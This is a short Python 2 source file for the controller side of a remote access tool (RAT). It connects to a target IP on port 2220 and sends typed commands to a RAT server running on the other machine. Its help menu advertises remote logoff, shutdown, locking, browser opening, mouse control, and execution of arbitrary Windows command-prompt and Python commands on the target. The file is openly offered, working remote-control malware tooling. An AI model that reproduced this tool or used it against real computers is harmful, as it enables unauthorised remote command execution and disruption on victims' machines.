# RAT Client by Matthew Taylor. Visit matthewaptaylor.github.io for more info.
# Python RAT Client v1.1 by Matthew Taylor. See more at matthewaptaylor.github.io. This is licensed under the MIT license. This license requires credit to be given to the program's creator.

print"""==========
RAT Client
==========
"""

import socket

HOST = raw_input("IP: ") # The remote host
PORT = 2220 # Default port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    command = raw_input("CLIENT > ")
    if command.lower() == "help":
        print """SERVER > Help for RAT Client v1.0:
              stop                                 Closes the RAT on the other machine
              exit                                 Closes the RAT on this machine
              send <message>                       Sends a message to the server
              logoff                               Logs off the computer
              shutdown                             Shuts down the computer
              restart                              Restarts the computer
              lock                                 Locks the computer
              open site http://example.com/        Opens the site example.com in the default web browser
              rom open                             Opens the CD/DVD-ROM drive
              rom close                            Closes the CD/DVD-ROM drive
              sound file                           Plays a sound file in the client's sound folder
              mouse [10, 100]                      Positons the mouse at (10, 100)
              cmd                                  Execute a windows command prompt command
              python                               Execute a python command"""
    else:
        if command[:4].lower() == "exit":
            print "CLIENT > Exit commanded"
            print "CLIENT > Exiting"
            exit()
        s.sendall(command)

s.close()
